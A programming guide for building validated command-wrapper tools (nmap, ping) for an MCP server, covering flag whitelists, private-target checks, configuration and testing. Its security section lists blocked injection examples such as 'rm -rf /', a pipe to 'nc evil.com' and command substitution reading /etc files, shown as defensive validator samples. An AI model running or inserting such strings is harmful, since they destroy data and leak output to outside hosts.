# MCP Server Tool Development Programming Guide

**Version:** 3.0  
**Purpose:** Definitive guide for developing new tools for the Enhanced MCP Server

---

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Quick Start: Creating Your First Tool](#quick-start-creating-your-first-tool)
4. [Tool Architecture Deep Dive](#tool-architecture-deep-dive)
5. [Step-by-Step Development Process](#step-by-step-development-process)
6. [Security & Validation Patterns](#security--validation-patterns)
7. [Advanced Features Integration](#advanced-features-integration)
8. [Configuration & Policy Management](#configuration--policy-management)
9. [Testing Your Tool](#testing-your-tool)
10. [Best Practices & Patterns](#best-practices--patterns)
11. [Troubleshooting Guide](#troubleshooting-guide)
12. [Complete Reference Examples](#complete-reference-examples)

---

## 1. Introduction

### Purpose of This Guide

This guide is the **single source of truth** for developing new tools for the Enhanced MCP Server. It provides:

- Complete understanding of the tool development lifecycle
- Proven patterns from production-ready implementations
- Security-first design principles
- Integration with circuit breakers, metrics, and health monitoring
- Configuration-driven behavior patterns

### What is a Tool?

In the MCP Server context, a **tool** is:

- A Python class that wraps a system command (e.g., `nmap`, `ping`, `traceroute`)
- Provides validated, secure execution of that command
- Integrates with server infrastructure (metrics, circuit breakers, health checks)
- Exposes functionality to MCP clients (Claude Desktop, HTTP API)

### Tool Lifecycle

```
Discovery → Registration → Validation → Execution → Monitoring → Cleanup
    ↓           ↓              ↓            ↓           ↓          ↓
  server.py   server.py    base_tool.py  base_tool.py metrics   server.py
```

---

## 2. Prerequisites

### Required Knowledge

- **Python 3.8+**: Async/await, type hints, dataclasses
- **Command-line tools**: Understanding of the tool you're wrapping
- **Network security**: RFC1918, CIDR notation, input validation
- **Pydantic**: Basic model validation (v1 and v2 compatibility)

### Required Files Structure

```
mcp_server/
├── base_tool.py           # Base class (DO NOT MODIFY)
├── server.py              # Server implementation
├── config.py              # Configuration management
├── circuit_breaker.py     # Circuit breaker pattern
├── metrics.py             # Metrics collection
├── health.py              # Health monitoring
└── tools/                 # YOUR TOOLS GO HERE
    ├── __init__.py
    ├── nmap_tool.py       # Reference implementation
    └── your_new_tool.py   # Your tool
```

### Environment Setup

```bash
# Install dependencies
pip install pydantic  # Required for input validation

# Optional but recommended
pip install prometheus-client  # For metrics
pip install fastapi uvicorn   # For HTTP transport testing
```

---

## 3. Quick Start: Creating Your First Tool

### Minimal Working Tool (5 minutes)

Create `mcp_server/tools/ping_tool.py`:

```python
"""Simple ping tool - minimal implementation."""
from mcp_server.base_tool import MCPBaseTool

class PingTool(MCPBaseTool):
    """Ping a host to check connectivity."""
    
    # REQUIRED: Command to execute
    command_name = "ping"
    
    # REQUIRED: Allowed flags (whitelist)
    allowed_flags = ["-c", "-W", "-i"]
    
    # Optional: Override defaults
    concurrency = 3
    default_timeout_sec = 30.0
```

**That's it!** This tool:
- ✅ Auto-discovered by server
- ✅ Validates RFC1918/lab.internal targets
- ✅ Blocks dangerous shell metacharacters
- ✅ Enforces allowed flags
- ✅ Provides circuit breaker protection
- ✅ Collects metrics
- ✅ Handles timeouts and resource limits

### Testing Your Tool

```python
from mcp_server.tools.ping_tool import PingTool
from mcp_server.base_tool import ToolInput
import asyncio

async def test_ping():
    tool = PingTool()
    
    # Valid execution
    result = await tool.run(ToolInput(
        target="192.168.1.1",
        extra_args="-c 3"
    ))
    
    print(f"Return code: {result.returncode}")
    print(f"Output: {result.stdout}")

asyncio.run(test_ping())
```

---

## 4. Tool Architecture Deep Dive

### Class Hierarchy

```
MCPBaseTool (ABC)
    ↑
    |
YourTool (Concrete Implementation)
```

### Required Class Variables

```python
class YourTool(MCPBaseTool):
    # MANDATORY: Name of system command
    command_name: ClassVar[str] = "your_command"
    
    # RECOMMENDED: Whitelist of allowed flags
    allowed_flags: ClassVar[Optional[Sequence[str]]] = [
        "-flag1", "-flag2", "--long-flag"
    ]
    
    # OPTIONAL: Concurrency limit (default: 2)
    concurrency: ClassVar[int] = 2
    
    # OPTIONAL: Default timeout (default: 300s)
    default_timeout_sec: ClassVar[float] = 300.0
    
    # OPTIONAL: Circuit breaker config
    circuit_breaker_failure_threshold: ClassVar[int] = 5
    circuit_breaker_recovery_timeout: ClassVar[float] = 60.0
    circuit_breaker_expected_exception: ClassVar[tuple] = (Exception,)
```

### Tool Discovery Rules

Your tool will be **auto-discovered** if:

✅ It's in the `mcp_server.tools` package (or configured package)  
✅ It's a concrete subclass of `MCPBaseTool`  
✅ Class name doesn't match exclusion patterns:
   - Prefixes: `Test*`, `Mock*`, `Abstract*`, `_*`, `Example*`
   - Suffixes: `*Base`, `*Mixin`, `*Interface`
   - Exact: `MCPBaseTool`

To **explicitly exclude** a class:

```python
class InternalHelper(MCPBaseTool):
    _is_tool = False  # Won't be discovered
    command_name = "helper"
```

---

## 5. Step-by-Step Development Process

### Phase 1: Planning

#### 1.1 Understand Your Command

```bash
# Study the command you're wrapping
man nmap
nmap --help

# Identify:
# - Required arguments
# - Optional flags
# - Dangerous flags (exclude these!)
# - Output format
# - Exit codes
```

#### 1.2 Security Assessment

**Questions to answer:**

- ❓ Can this command execute arbitrary code? (e.g., `--script` in nmap)
- ❓ Can it write files? (restrict or validate paths)
- ❓ Can it consume excessive resources? (set limits)
- ❓ Does it accept shell metacharacters? (block them)
- ❓ Can it scan public networks? (restrict targets)

**Example risk matrix:**

```python
# HIGH RISK - Requires strict controls
allowed_flags = ["-sV"]  # Service detection only
# Blocked: -sS (SYN scan), -O (OS detection), --script (arbitrary scripts)

# LOW RISK - More permissive
allowed_flags = ["-c", "-W", "-i", "-q"]  # Ping flags
```

### Phase 2: Implementation

#### 2.1 Create Tool File

```python
"""
Your tool description.

Features:
- What it does
- Security controls
- Usage examples

Safety Controls:
- List all safety measures
- Restrictions
- Validation rules
"""
import logging
from typing import Sequence, Optional, ClassVar
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

log = logging.getLogger(__name__)

class YourTool(MCPBaseTool):
    """One-line description for documentation."""
    
    command_name = "your_command"
    allowed_flags = ["-safe-flag"]
```

#### 2.2 Define Allowed Flags (Critical!)

```python
# Pattern 1: Simple whitelist
allowed_flags = ["-v", "-q", "-c"]

# Pattern 2: With value flags
allowed_flags = [
    "-c",      # Count flag
    "-W",      # Timeout flag
    "-i",      # Interval flag
]

# Also define flags that REQUIRE values
_FLAGS_REQUIRE_VALUE = {"-c", "-W", "-i"}

# Pattern 3: With extra allowed tokens (for optimization)
_EXTRA_ALLOWED_TOKENS = {
    "5",       # Common value for -c
    "1000",    # Common value for --timeout
}
```

#### 2.3 Override Defaults (Optional)

```python
class SlowTool(MCPBaseTool):
    command_name = "slow_scanner"
    allowed_flags = ["-deep"]
    
    # Tool-specific overrides
    concurrency = 1                    # Only one at a time
    default_timeout_sec = 1800.0       # 30 minutes
    
    # Circuit breaker tuning
    circuit_breaker_failure_threshold = 3      # Open after 3 failures
    circuit_breaker_recovery_timeout = 300.0   # 5 min recovery
```

### Phase 3: Advanced Validation (Optional)

#### 3.1 Custom Input Validation

Override `_execute_tool` to add custom validation:

```python
async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Execute with custom validation."""
    
    # Custom validation logic
    validation_error = self._validate_custom_requirements(inp)
    if validation_error:
        return validation_error
    
    # Call base implementation
    return await super()._execute_tool(inp, timeout_sec)

def _validate_custom_requirements(self, inp: ToolInput) -> Optional[ToolOutput]:
    """Add tool-specific validation."""
    # Example: Validate network size for nmap
    if "/" in inp.target:
        network = ipaddress.ip_network(inp.target, strict=False)
        if network.num_addresses > 1024:
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message=f"Network too large: {network.num_addresses} hosts",
                recovery_suggestion="Use /22 or smaller prefix",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=inp.target
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
    
    return None
```

#### 3.2 Custom Argument Parsing

Override `_parse_args` for complex validation:

```python
def _parse_args(self, extra_args: str) -> Sequence[str]:
    """Custom argument parsing with additional validation."""
    # Call base parsing first
    tokens = super()._parse_args(extra_args)
    
    # Add custom logic
    validated = []
    for token in tokens:
        # Example: Validate port specifications
        if token.startswith("-p"):
            if not self._validate_port_spec(token):
                raise ValueError(f"Invalid port specification: {token}")
        validated.append(token)
    
    return validated

def _validate_port_spec(self, port_spec: str) -> bool:
    """Validate port specification format."""
    # Your validation logic
    return True
```

#### 3.3 Argument Optimization

Add smart defaults for better UX:

```python
def _optimize_args(self, extra_args: str) -> str:
    """Add smart defaults if not specified."""
    import shlex
    
    tokens = shlex.split(extra_args) if extra_args else []
    optimized = []
    
    # Check what's missing
    has_count = any("-c" in t for t in tokens)
    has_timeout = any("-W" in t for t in tokens)
    
    # Add defaults
    if not has_count:
        optimized.extend(["-c", "3"])
        log.debug("optimization.added_default flag=-c value=3")
    
    if not has_timeout:
        optimized.extend(["-W", "5"])
        log.debug("optimization.added_default flag=-W value=5")
    
    # Append original args
    optimized.extend(tokens)
    
    return " ".join(optimized)

# Use in _execute_tool
async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    # Optimize arguments
    optimized_args = self._optimize_args(inp.extra_args or "")
    
    # Create enhanced input
    enhanced_input = ToolInput(
        target=inp.target,
        extra_args=optimized_args,
        timeout_sec=timeout_sec or inp.timeout_sec,
        correlation_id=inp.correlation_id
    )
    
    # Execute with base
    return await super()._execute_tool(enhanced_input, timeout_sec)
```

---

## 6. Security & Validation Patterns

### 6.1 Input Validation Layers

The base tool provides **4 layers of validation**:

```
Layer 1: Pydantic Validators (ToolInput model)
    ↓ target validation (RFC1918, .lab.internal)
    ↓ extra_args length limit (2048 bytes)
    ↓ metacharacter blocking (;,&,|,`,etc.)

Layer 2: Command Resolution
    ↓ shutil.which() to find command
    ↓ Fail if command not in PATH

Layer 3: Argument Parsing & Sanitization
    ↓ shlex.split() for safe parsing
    ↓ Token validation (alphanumeric + safe chars)
    ↓ Flag whitelist enforcement
    ↓ Value validation for flags

Layer 4: Resource Limits (Unix/Linux)
    ↓ CPU time limit (rlimit)
    ↓ Memory limit (512MB default)
    ↓ File descriptor limit (256 default)
    ↓ Core dump disabled
```

### 6.2 Target Validation Pattern

**Built-in validation** (automatic):

```python
# ToolInput validates these automatically:
✅ "192.168.1.1"           # RFC1918 private IP
✅ "10.0.0.0/8"            # RFC1918 network
✅ "172.16.0.0/12"         # RFC1918 network
✅ "server.lab.internal"   # .lab.internal hostname
❌ "8.8.8.8"               # Public IP (rejected)
❌ "google.com"            # Public hostname (rejected)
```

**Custom validation** (add in your tool):

```python
def _validate_custom_requirements(self, inp: ToolInput) -> Optional[ToolOutput]:
    """Add tool-specific target validation."""
    import ipaddress
    
    # Example: Reject loopback for network scans
    if self.command_name == "nmap":
        try:
            ip = ipaddress.ip_address(inp.target)
            if ip.is_loopback:
                error_context = ErrorContext(
                    error_type=ToolErrorType.VALIDATION_ERROR,
                    message="Loopback addresses not allowed for network scans",
                    recovery_suggestion="Use a private network address",
                    timestamp=datetime.now(),
                    tool_name=self.tool_name,
                    target=inp.target
                )
                return self._create_error_output(error_context, inp.correlation_id or "")
        except ValueError:
            pass  # Not an IP, continue
    
    return None
```

### 6.3 Argument Validation Patterns

#### Pattern 1: Simple Flag Whitelist

```python
class SimpleTool(MCPBaseTool):
    command_name = "mytool"
    
    # Only these flags are allowed
    allowed_flags = ["-v", "-q", "-c"]
    
    # Auto-rejects:
    # ❌ -x (not in whitelist)
    # ❌ --unknown (not in whitelist)
    # ❌ $(cmd) (metacharacter)
```

#### Pattern 2: Flags with Required Values

```python
class ToolWithValues(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = ["-c", "-t", "-o"]
    
    # These flags MUST have values
    _FLAGS_REQUIRE_VALUE = {"-c", "-t"}
    
    # Valid: -c 5, -t 10, -o
    # Invalid: -c (missing value), -t (missing value)
```

#### Pattern 3: Complex Value Validation

```python
def _sanitize_tokens(self, tokens: Sequence[str]) -> Sequence[str]:
    """Override for custom value validation."""
    safe = []
    expect_value_for = None
    
    for token in tokens:
        # Handle flag values
        if expect_value_for:
            # Validate value for previous flag
            if expect_value_for == "-c":
                if not token.isdigit() or int(token) > 100:
                    raise ValueError(f"Invalid count: {token} (must be 1-100)")
            
            safe.append(token)
            expect_value_for = None
            continue
        
        # Check if flag requires value
        if token in self._FLAGS_REQUIRE_VALUE:
            expect_value_for = token
        
        safe.append(token)
    
    return safe
```

### 6.4 Dangerous Pattern Prevention

**Always block these:**

```python
# Blocked by default in base_tool.py
_DENY_CHARS = re.compile(r"[;&|`$><\n\r]")

# Examples of blocked inputs:
❌ "arg1; rm -rf /"       # Command injection
❌ "arg1 && malware"      # Command chaining
❌ "arg1 | nc evil.com"   # Pipe to external
❌ "arg1 `whoami`"        # Command substitution
❌ "arg1 $(cat /etc/pwd)" # Command substitution
❌ "arg1 > /tmp/evil"     # File redirection
```

**Additional patterns to block:**

```python
# In your tool's validation
def _parse_args(self, extra_args: str) -> Sequence[str]:
    tokens = super()._parse_args(extra_args)
    
    for token in tokens:
        # Block path traversal
        if ".." in token:
            raise ValueError(f"Path traversal detected: {token}")
        
        # Block absolute paths (if inappropriate)
        if token.startswith("/"):
            raise ValueError(f"Absolute paths not allowed: {token}")
        
        # Block wildcards (if risky for your tool)
        if "*" in token or "?" in token:
            raise ValueError(f"Wildcards not allowed: {token}")
    
    return tokens
```

---

## 7. Advanced Features Integration

### 7.1 Configuration Integration

#### Basic Pattern

```python
from mcp_server.config import get_config

class ConfigurableTool(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        """Apply configuration with safe defaults."""
        try:
            # Read tool-specific config
            if hasattr(self.config, 'tool') and self.config.tool:
                if hasattr(self.config.tool, 'default_timeout'):
                    # Clamp to safe range
                    self.default_timeout_sec = max(
                        60.0,
                        min(3600.0, float(self.config.tool.default_timeout))
                    )
        except Exception as e:
            log.error("config.apply_failed error=%s using_defaults", str(e))
            # Keep class defaults
```

#### Advanced: Policy-Based Controls

```python
class PolicyControlledTool(MCPBaseTool):
    command_name = "scanner"
    BASE_ALLOWED_FLAGS = ["-safe", "-normal"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self.allow_intrusive = False
        self._apply_config()
    
    def _apply_config(self):
        """Apply policy-based configuration."""
        # Read security policy
        if hasattr(self.config, 'security') and self.config.security:
            if hasattr(self.config.security, 'allow_intrusive'):
                self.allow_intrusive = bool(self.config.security.allow_intrusive)
                
                if self.allow_intrusive:
                    log.warning("policy.intrusive_enabled tool=%s", self.tool_name)
                else:
                    log.info("policy.intrusive_disabled tool=%s", self.tool_name)
    
    @property
    def allowed_flags(self):
        """Dynamic flag list based on policy."""
        flags = list(self.BASE_ALLOWED_FLAGS)
        
        if self.allow_intrusive:
            flags.extend(["-aggressive", "-deep-scan"])
        
        return flags
```

### 7.2 Result Parsing

#### Pattern 1: Simple Line Parsing

```python
def parse_output(self, output: str) -> Dict[str, Any]:
    """Parse tool output into structured data."""
    result = {
        "hosts": [],
        "errors": [],
        "summary": {}
    }
    
    for line in output.split('\n'):
        line = line.strip()
        
        # Parse host lines
        if line.startswith("Host:"):
            result["hosts"].append(line.split(":", 1)[1].strip())
        
        # Parse errors
        elif "ERROR" in line:
            result["errors"].append(line)
    
    return result
```

#### Pattern 2: Regex Extraction

```python
import re

class RegexParsingTool(MCPBaseTool):
    # Compile patterns once (performance)
    _HOST_PATTERN = re.compile(r'Host:\s+(\S+)')
    _PORT_PATTERN = re.compile(r'(\d+)/(tcp|udp)\s+(\w+)')
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse with compiled regex patterns."""
        hosts = self._HOST_PATTERN.findall(output)
        ports = [
            {"port": int(m[0]), "proto": m[1], "state": m[2]}
            for m in self._PORT_PATTERN.finditer(output)
        ]
        
        return {
            "hosts": hosts,
            "ports": ports,
            "total_hosts": len(hosts),
            "open_ports": len([p for p in ports if p["state"] == "open"])
        }
```

#### Pattern 3: Integration with ToolOutput

```python
async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Execute and enhance output with parsed data."""
    # Call base execution
    result = await super().run(inp, timeout_sec)
    
    # Parse output if successful
    if result.returncode == 0 and result.stdout:
        try:
            parsed = self.parse_output(result.stdout)
            
            # Add to metadata
            result.ensure_metadata()
            result.metadata["parsed_data"] = parsed
            result.metadata["hosts_found"] = len(parsed.get("hosts", []))
            
            log.info("output.parsed tool=%s hosts=%d",
                    self.tool_name, parsed.get("total_hosts", 0))
        except Exception as e:
            log.warning("output.parse_failed tool=%s error=%s", 
                       self.tool_name, str(e))
            # Don't fail on parse errors, just log
    
    return result
```

### 7.3 Scan Templates / Presets

```python
from enum import Enum

class ScanMode(Enum):
    """Predefined scan modes."""
    QUICK = "quick"
    STANDARD = "standard"
    THOROUGH = "thorough"

class TemplatedTool(MCPBaseTool):
    command_name = "scanner"
    allowed_flags = ["-q", "-s", "-t", "-v"]
    
    def _get_template_args(self, mode: ScanMode) -> str:
        """Get arguments for scan mode."""
        templates = {
            ScanMode.QUICK: "-q -v",
            ScanMode.STANDARD: "-s",
            ScanMode.THOROUGH: "-t -v",
        }
        return templates.get(mode, templates[ScanMode.STANDARD])
    
    async def run_with_template(
        self,
        target: str,
        mode: ScanMode = ScanMode.STANDARD,
        timeout_sec: Optional[float] = None
    ) -> ToolOutput:
        """Run with predefined template."""
        args = self._get_template_args(mode)
        
        inp = ToolInput(
            target=target,
            extra_args=args,
            timeout_sec=timeout_sec
        )
        
        log.info("template.scan tool=%s mode=%s target=%s",
                self.tool_name, mode.value, target)
        
        return await self.run(inp, timeout_sec)
```

### 7.4 Caching for Performance

```python
class CachedTool(MCPBaseTool):
    command_name = "lookup"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self._cache: Dict[str, Any] = {}
        self._cache_hits = 0
        self._cache_misses = 0
    
    def _get_from_cache(self, key: str) -> Optional[Any]:
        """Thread-safe cache retrieval."""
        if key in self._cache:
            self._cache_hits += 1
            log.debug("cache.hit key=%s hits=%d", key, self._cache_hits)
            return self._cache[key]
        
        self._cache_misses += 1
        return None
    
    def _add_to_cache(self, key: str, value: Any):
        """Add to cache with size limit."""
        MAX_CACHE_SIZE = 1000
        
        if len(self._cache) >= MAX_CACHE_SIZE:
            # Simple FIFO eviction
            first_key = next(iter(self._cache))
            del self._cache[first_key]
            log.debug("cache.evicted key=%s size=%d", first_key, len(self._cache))
        
        self._cache[key] = value
    
    def clear_cache(self):
        """Clear cache (useful for testing)."""
        self._cache.clear()
        self._cache_hits = 0
        self._cache_misses = 0
        log.info("cache.cleared tool=%s", self.tool_name)
    
    def get_cache_stats(self) -> Dict[str, int]:
        """Get cache statistics."""
        return {
            "size": len(self._cache),
            "hits": self._cache_hits,
            "misses": self._cache_misses,
            "hit_rate": self._cache_hits / (self._cache_hits + self._cache_misses)
                if (self._cache_hits + self._cache_misses) > 0 else 0.0
        }
```

---

## 8. Configuration & Policy Management

### 8.1 Configuration File Structure

Your tool can read from `config.yaml`:

```yaml
# config.yaml
security:
  allow_intrusive: false        # Controls dangerous operations

tool:
  default_timeout: 600           # Override class default
  default_concurrency: 1         # Override class default

circuit_breaker:
  failure_threshold: 5
  recovery_timeout: 120.0

resource_limits:
  max_memory_mb: 512
  max_file_descriptors: 256
```

### 8.2 Reading Configuration

```python
from mcp_server.config import get_config

class MyTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        """Apply configuration with validation and clamping."""
        try:
            # Read with fallback
            if hasattr(self.config, 'tool'):
                # Timeout with safe clamping
                timeout = getattr(self.config.tool, 'default_timeout', self.default_timeout_sec)
                self.default_timeout_sec = max(60.0, min(3600.0, float(timeout)))
                
                # Concurrency with safe clamping
                concurrency = getattr(self.config.tool, 'default_concurrency', self.concurrency)
                self.concurrency = max(1, min(10, int(concurrency)))
            
            log.debug("config.applied tool=%s timeout=%.1f concurrency=%d",
                     self.tool_name, self.default_timeout_sec, self.concurrency)
        
        except Exception as e:
            log.error("config.apply_failed error=%s", str(e))
            # Keep class defaults on error
```

### 8.3 Environment Variable Overrides

```python
import os

class EnvAwareTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self._apply_env_overrides()
    
    def _apply_env_overrides(self):
        """Apply environment variable overrides."""
        # Tool-specific timeout
        env_timeout = os.getenv(f"{self.command_name.upper()}_TIMEOUT")
        if env_timeout:
            try:
                self.default_timeout_sec = float(env_timeout)
                log.info("env.override param=timeout value=%.1f", 
                        self.default_timeout_sec)
            except ValueError:
                log.warning("env.invalid_timeout value=%s", env_timeout)
        
        # Tool-specific concurrency
        env_concurrency = os.getenv(f"{self.command_name.upper()}_CONCURRENCY")
        if env_concurrency:
            try:
                self.concurrency = int(env_concurrency)
                log.info("env.override param=concurrency value=%d", 
                        self.concurrency)
            except ValueError:
                log.warning("env.invalid_concurrency value=%s", env_concurrency)
```

---

## 9. Testing Your Tool

### 9.1 Unit Testing Pattern

```python
# tests/test_my_tool.py
import pytest
from mcp_server.tools.my_tool import MyTool
from mcp_server.base_tool import ToolInput, ToolOutput

@pytest.fixture
def tool():
    """Create tool instance."""
    return MyTool()

@pytest.mark.asyncio
async def test_basic_execution(tool):
    """Test basic tool execution."""
    result = await tool.run(ToolInput(
        target="192.168.1.1",
        extra_args="-v"
    ))
    
    assert isinstance(result, ToolOutput)
    assert result.returncode is not None

@pytest.mark.asyncio
async def test_invalid_target(tool):
    """Test target validation."""
    result = await tool.run(ToolInput(
        target="8.8.8.8",  # Public IP, should fail
        extra_args=""
    ))
    
    assert result.returncode != 0
    assert "private" in result.stderr.lower()

@pytest.mark.asyncio
async def test_invalid_flag(tool):
    """Test flag validation."""
    result = await tool.run(ToolInput(
        target="192.168.1.1",
        extra_args="-X --dangerous"  # Not in allowed_flags
    ))
    
    assert result.returncode != 0
    assert "not allowed" in result.stderr.lower()

def test_command_resolution(tool):
    """Test command exists."""
    cmd = tool._resolve_command()
    assert cmd is not None, f"{tool.command_name} not found in PATH"

def test_allowed_flags(tool):
    """Test allowed flags are defined."""
    assert tool.allowed_flags is not None
    assert len(tool.allowed_flags) > 0

@pytest.mark.asyncio
async def test_timeout_handling(tool):
    """Test timeout behavior."""
    result = await tool.run(
        ToolInput(target="192.168.1.1"),
        timeout_sec=0.1  # Very short timeout
    )
    
    # Should timeout gracefully
    assert result.timed_out or result.returncode != 0
```

### 9.2 Integration Testing

```python
@pytest.mark.integration
@pytest.mark.asyncio
async def test_full_scan_workflow(tool):
    """Test complete scan workflow."""
    # Execute scan
    result = await tool.run(ToolInput(
        target="192.168.1.0/24",
        extra_args="-v --quick"
    ))
    
    # Verify execution
    assert result.execution_time is not None
    assert result.correlation_id is not None
    
    # Parse output
    if result.returncode == 0 and result.stdout:
        parsed = tool.parse_output(result.stdout)
        assert isinstance(parsed, dict)
        assert "hosts" in parsed

@pytest.mark.integration
async def test_circuit_breaker_integration(tool):
    """Test circuit breaker behavior."""
    # Force multiple failures
    for _ in range(tool.circuit_breaker_failure_threshold + 1):
        await tool.run(ToolInput(
            target="192.168.1.1",
            extra_args="--invalid-flag"  # Cause failure
        ))
    
    # Circuit should be open
    if tool._circuit_breaker:
        from mcp_server.circuit_breaker import CircuitBreakerState
        assert tool._circuit_breaker.state == CircuitBreakerState.OPEN
```

### 9.3 Property-Based Testing

```python
from hypothesis import given, strategies as st

@given(
    target=st.one_of(
        st.from_regex(r'192\.168\.\d{1,3}\.\d{1,3}', fullmatch=True),
        st.from_regex(r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', fullmatch=True),
    )
)
@pytest.mark.asyncio
async def test_target_validation_property(tool, target):
    """Property: All RFC1918 addresses should be accepted."""
    result = await tool.run(ToolInput(target=target))
    
    # Should not fail on validation (may fail on execution)
    assert "Target must be" not in result.stderr
```

### 9.4 Mock Testing for Development

```python
from unittest.mock import AsyncMock, patch

@pytest.mark.asyncio
async def test_with_mock_command():
    """Test without actual command execution."""
    tool = MyTool()
    
    # Mock the subprocess execution
    mock_output = ToolOutput(
        stdout="Mocked output",
        stderr="",
        returncode=0,
        execution_time=1.0
    )
    
    with patch.object(tool, '_spawn', return_value=mock_output):
        result = await tool.run(ToolInput(target="192.168.1.1"))
        
        assert result.stdout == "Mocked output"
        assert result.returncode == 0
```

---

## 10. Best Practices & Patterns

### 10.1 Security Best Practices

#### ✅ DO:

```python
# 1. Use whitelist approach for flags
allowed_flags = ["-safe", "-flag"]  # Explicit allow

# 2. Validate all input rigorously
def _validate_input(self, value):
    if not self._is_safe(value):
        raise ValueError(f"Invalid input: {value}")

# 3. Clamp configuration values
timeout = max(60, min(3600, config_value))

# 4. Log security events
log.warning("security.blocked_flag flag=%s tool=%s", flag, self.tool_name)

# 5. Fail closed (deny by default)
if flag not in self.allowed_flags:
    raise ValueError(f"Flag not allowed: {flag}")

# 6. Use compiled regex for performance
_PATTERN = re.compile(r'^[a-z0-9-]+$')
```

#### ❌ DON'T:

```python
# 1. Don't use blacklist approach
forbidden_flags = ["-X"]  # Too easy to bypass

# 2. Don't trust input
cmd = f"mytool {user_input}"  # Shell injection risk!

# 3. Don't catch and ignore security errors
try:
    self._validate(input)
except ValueError:
    pass  # NEVER DO THIS!

# 4. Don't allow arbitrary code execution
if "--script" in args:
    # Without validation, this is dangerous!

# 5. Don't skip validation for "trusted" sources
if source == "admin":
    # Still validate!
```

### 10.2 Performance Best Practices

```python
# 1. Compile regex patterns once
class OptimizedTool(MCPBaseTool):
    _PATTERN = re.compile(r'pattern')  # Class-level
    
    def parse(self, text):
        return self._PATTERN.findall(text)  # Reuse

# 2. Use caching for repeated operations
def _expensive_operation(self, key):
    if key in self._cache:
        return self._cache[key]
    
    result = self._compute(key)
    self._cache[key] = result
    return result

# 3. Limit concurrency appropriately
concurrency = 1  # For heavy tools
concurrency = 5  # For light tools

# 4. Set realistic timeouts
default_timeout_sec = 60   # For quick operations
default_timeout_sec = 600  # For scans

# 5. Clean up resources
def clear_caches(self):
    self._cache.clear()
    log.debug("cache.cleared")
```

### 10.3 Logging Best Practices

```python
# Use structured logging with key=value pairs
log.info("tool.execution target=%s args=%s timeout=%.1f",
        inp.target, inp.extra_args, timeout_sec)

# Log security events at appropriate levels
log.warning("security.blocked_flag flag=%s", dangerous_flag)
log.error("security.injection_attempt input=%s", suspicious_input)

# Log performance metrics
log.debug("performance.optimization added=%s", optimization)
log.info("performance.execution_time tool=%s duration=%.2fs", 
        self.tool_name, execution_time)

# Log configuration changes
log.info("config.applied param=%s old=%s new=%s", 
        param, old_value, new_value)

# Don't log sensitive data
log.info("auth.success user=%s", username)  # OK
log.info("auth.attempt password=%s", password)  # NEVER!
```

### 10.4 Error Handling Patterns

```python
# Pattern 1: Validation errors
def _validate(self, inp):
    if not self._is_valid(inp):
        error_context = ErrorContext(
            error_type=ToolErrorType.VALIDATION_ERROR,
            message="Validation failed",
            recovery_suggestion="Check input format",
            timestamp=datetime.now(),
            tool_name=self.tool_name,
            target=inp.target,
            metadata={"detail": "specific error"}
        )
        return self._create_error_output(error_context, inp.correlation_id or "")
    return None

# Pattern 2: Graceful degradation
try:
    result = self._parse_output(output)
except Exception as e:
    log.warning("parse.failed error=%s", str(e))
    result = {"raw": output}  # Fallback to raw

# Pattern 3: Resource cleanup
try:
    result = await self._execute()
finally:
    self._cleanup_resources()

# Pattern 4: Circuit breaker friendly
try:
    result = await self._risky_operation()
except SpecificError as e:
    # Let circuit breaker track this
    raise
except UnexpectedError as e:
    # Log but don't break circuit
    log.error("unexpected.error error=%s", str(e))
    # Return error output instead of raising
    return self._create_error_output(...)
```

---

## 11. Troubleshooting Guide

### 11.1 Tool Not Discovered

**Symptom:** Tool class exists but not loaded by server

**Checklist:**

```python
# 1. Check class name doesn't match exclusion patterns
class MyTool(MCPBaseTool):  # ✅ Good
class TestTool(MCPBaseTool):  # ❌ Excluded (Test* prefix)
class ToolBase(MCPBaseTool):  # ❌ Excluded (*Base suffix)

# 2. Check it's in the correct package
mcp_server/tools/my_tool.py  # ✅ Correct location

# 3. Check it's a concrete class
class MyTool(MCPBaseTool):  # ✅ Concrete
    command_name = "mytool"

class AbstractTool(MCPBaseTool):  # ❌ Missing command_name
    pass

# 4. Check __init__.py exists
mcp_server/tools/__init__.py  # Must exist (can be empty)

# 5. Enable debug logging
LOG_LEVEL=DEBUG python -m mcp_server.server

# 6. Check import errors
python -c "from mcp_server.tools.my_tool import MyTool; print('OK')"
```

### 11.2 Validation Failures

**Symptom:** Valid inputs being rejected

```python
# Debug validation
def _parse_args(self, extra_args: str) -> Sequence[str]:
    log.debug("parse.start extra_args=%s", extra_args)
    
    try:
        tokens = shlex.split(extra_args)
        log.debug("parse.tokens count=%d tokens=%s", len(tokens), tokens)
    except Exception as e:
        log.error("parse.failed error=%s", str(e))
        raise
    
    # Continue with validation...
```

### 11.3 Command Not Found

**Symptom:** Tool fails with "command not found"

```python
# Test command resolution
def test_command():
    tool = MyTool()
    cmd = tool._resolve_command()
    print(f"Resolved: {cmd}")
    print(f"PATH: {os.getenv('PATH')}")

# Common solutions:
# 1. Install command: apt-get install nmap
# 2. Add to PATH: export PATH=$PATH:/usr/local/bin
# 3. Use full path: command_name = "/usr/bin/nmap"
```

### 11.4 Circuit Breaker Open

**Symptom:** Tool returns circuit breaker errors

```python
# Check circuit breaker state
tool = MyTool()
if tool._circuit_breaker:
    print(f"State: {tool._circuit_breaker.state}")
    print(f"Failures: {tool._circuit_breaker._failure_count}")
    print(f"Threshold: {tool.circuit_breaker_failure_threshold}")

